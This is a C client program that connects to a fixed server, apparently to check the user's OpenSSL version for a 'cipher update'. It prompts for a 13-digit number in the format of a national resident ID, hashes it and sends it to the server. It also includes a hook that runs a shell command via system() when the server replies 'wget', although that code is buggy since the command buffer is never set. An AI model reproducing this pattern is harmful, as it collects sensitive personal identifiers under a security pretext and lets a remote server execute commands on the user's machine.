#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <termio.h>
#include <openssl/sha.h>

#define Buf_len 128

int check_cipher(int sock, char buf[]);
int input_send_privacy(int sock);
int getch();

typedef struct SHA256state_st SHA256_CTX;

int main(){
    int sock, i, succ, err = 0;
    struct sockaddr_in server_addr;
    char buf[Buf_len+1], type_num[2], tmp[Buf_len];

    if((sock = socket(PF_INET, SOCK_STREAM, 0)) < 0){
            printf("failed socket func\n");
            exit(0);
    }

    memset(&server_addr, 0, sizeof(server_addr));

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(15240);
    server_addr.sin_addr.s_addr = inet_addr("10.178.0.2");
    // = inet_pton( AF_INET, "34.64.182.41", &server_addr.sin_addr.s_addr );

    if(connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0){
        printf("failed connect func\n");
        exit(0);
    }

    while((i = read(sock, buf, Buf_len)) > 0){
        buf[i] = '\0';
        if(strncmp(buf, "Check", 5) == 0){ // 2
            err = check_cipher(sock, buf);
            if(err == 0){
                sprintf(buf, "fail");
                write(sock, buf, strlen(buf));
                break;
            }
            i = read(sock, buf, Buf_len);
            buf[i] = '\0';
            if(strncmp(buf, "wget", 4) == 0) system(tmp);
        }
        else if(strncmp(buf, "Input", 5) == 0){ // 3
            printf("%s", buf);
            err = input_send_privacy(sock);
            if(err == 0) break;
        }
        else if(strncmp(buf, "If", 2) == 0){ // b
            printf("%s\n", buf);
            while(1){
                fgets(buf, Buf_len, stdin);
                if((int)buf[0] == '1' || (int)buf[0] == '2') break;
                else printf("Only input 1 or 2\n");
            }
            buf[1] = '\0';
            write(sock, buf, strlen(buf));
        }
        else if(strncmp(buf, "result", 6) == 0){ // 6
            printf("%s\n", buf);
            break;
        }
        else{ // 5 / c
            printf("%s\n", buf);
            fgets(buf, Buf_len, stdin);
            write(sock, buf, strlen(buf));
        }        
    }

    close(sock);
    return 0;
}

int check_cipher(int sock, char buf[]){
    char tmpbuf[Buf_len];
    int err = 1;

    strcpy(tmpbuf, buf);
    
    printf("%s\n", tmpbuf);
    while(1){
        fgets(tmpbuf, sizeof(tmpbuf), stdin);
        tmpbuf[strlen(tmpbuf)-1] = '\0';
        if((int)tmpbuf[0] == 'y' || (int)tmpbuf[0] == 'Y'){
            if((int)tmpbuf[1] == 'e' || (int)tmpbuf[1] == 'E'){
                if((int)tmpbuf[2] == 's' || (int)tmpbuf[2] == 'S') err = 1;
                else err = 0;
            }
            else err = 0;
        }
        else err = 0;

        if((int)tmpbuf[0] == 'n' || (int)tmpbuf[0] == 'N'){
            if((int)tmpbuf[1] == 'o' || (int)tmpbuf[1] == 'O'){
                printf("If you don't want to upadte cipher version\n");
                printf("Vulnerahble we can do nothing!!\n");
                printf("Please attempt to when you think updating cipher version.\n");
                return 0;
            }
        }

        if(err == 1){   // cipher version 확인
            system("openssl version > ./version.txt");
            FILE *ver_fd;
            ver_fd = fopen("version.txt", "r");
            fgets(buf, Buf_len, ver_fd);
            write(sock, buf, strlen(buf));
            fclose(ver_fd);
            break;
        }
        printf("Please input only 'yes' or 'no'\n");
    }
    
    return 1;
}

int input_send_privacy(int sock){
    char buf[Buf_len], privacy[14], result_hash[65];
    int i, err = 2;
    //sha
    SHA256_CTX sha256;
    unsigned char hash[SHA256_DIGEST_LENGTH]; // SHA256_DIGEST_LENGTH = 32

    for(i = 0; i < 13; i++){
        privacy[i] = getch();
        if((int)privacy[i] == 10){
            printf("Input 13 numbers\n");
            err--;
            i = -1;
        }
        else if((int)privacy[i] == 127){
            i = -1;
        }
        else if(i == 6){
            if(!((int)privacy[6] == '1' || (int)privacy[6] == '2' || (int)privacy[6] == '3' || (int)privacy[6] == '4')){
                printf("First number of back part is incorrect.\n");
                if(err == 2) printf("Input : ");
                i = -1;
                err--;
            }
        }
        else if((int)privacy[i] < 48 || 57 < (int)privacy[i]){
            if(err == 2){
                printf("Input only number.\n");
                printf("Input : ");
                i = -1;
            }
            err--;
        }
        
        if(err == 0){
            printf("You fail 2 twice, so disconnect\n");
            break;
        }
    }
    privacy[13] = '\0';
    printf("\n");

    if(err != 0){ // Make hash and write
        SHA256_Init(&sha256);
        SHA256_Update(&sha256, privacy, strlen(privacy));
        SHA256_Final(hash, &sha256);

        // transform to heximal
        for(i = 0; i < 32; i++){
            sprintf(result_hash + (i * 2), "%02x", hash[i]);
        }
        result_hash[64] = '\0';
        write(sock, result_hash, strlen(result_hash));
    }
    else if(err == 0){
        sprintf(buf, "fail");
        write(sock, buf, strlen(buf));
    }

    return err;
}

int getch(){
    int spell;
    struct termios buf;
    struct termios save;

    tcgetattr(0, &save);
    buf = save;

    buf.c_lflag &= ~(ICANON|ECHO);
    buf.c_cc[VMIN] = 1;
    buf.c_cc[VTIME] = 0;

    tcsetattr(0, TCSAFLUSH, &buf);
    spell = getchar();
    tcsetattr(0, TCSAFLUSH, &save);

    return spell;
}